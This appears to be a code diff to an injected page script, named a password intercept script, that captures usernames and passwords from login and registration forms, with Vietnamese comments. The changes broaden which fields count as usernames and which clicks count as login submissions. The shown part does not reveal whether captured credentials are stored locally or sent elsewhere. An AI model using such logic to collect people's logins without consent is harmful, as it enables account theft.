@@ -160,7 +160,9 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
         } else if (el.type === 'email' || el.type === 'text' || el.type === 'tel') {
           if (isSearchOrIrrelevantField(el) || isOtpOrNonPasswordField(el)) return;
           var tag = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' + (el.getAttribute('autocomplete') || '') + ' ' + (el.getAttribute('aria-label') || '')).toLowerCase();
+          var hasPass = Boolean(document.querySelector('input[type="password"]'));
           if (
+            hasPass ||
             el.type === 'email' ||
             el.type === 'tel' ||
             tag.includes('user') ||
@@ -173,7 +175,9 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
             tag.includes('đăng nhập') ||
             tag.includes('dang nhap') ||
             tag.includes('tên') ||
-            tag.includes('ten')
+            tag.includes('ten') ||
+            tag.includes('nick') ||
+            tag.includes('member')
           ) {
             pendingUsername = (el.value || '').trim();
           }
@@ -321,7 +325,7 @@ export const PASSWORD_INTERCEPT_SCRIPT = `
 
     // 4. Bắt sự kiện Click nút Đăng nhập / Đăng ký
     document.addEventListener('click', function(e) {
-      var btn = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"], a, div[class*="btn" i], span[class*="btn" i]') : null;
+      var btn = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], input[type="button"], [role="button"], a, div[class*="btn" i], span[class*="btn" i], div[class*="button" i], span[class*="button" i], div[class*="submit" i], span[class*="submit" i], div[class*="login" i], div[class*="register" i], [id*="btn" i], [id*="submit" i], [id*="login" i]') : null;
       if (btn) {
         var btnText = (btn.innerText || btn.value || '').toLowerCase();
         // Không bắt các nút gửi lại OTP hay hủy
